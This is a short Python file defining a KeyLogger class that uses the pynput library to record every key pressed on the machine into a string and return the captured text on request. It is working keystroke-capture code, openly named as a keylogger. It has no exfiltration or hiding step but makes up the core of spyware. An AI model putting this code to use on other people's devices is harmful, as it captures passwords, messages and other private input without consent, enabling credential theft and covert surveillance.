from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.pressed_keys = ""

    def on_press(self, key):
        try:
            self.pressed_keys += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                self.pressed_keys += " "
            elif key == keyboard.Key.enter:
                self.pressed_keys += "\n"
            else:
                self.pressed_keys += f" {key} "

    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def get_data(self):
        return self.pressed_keys
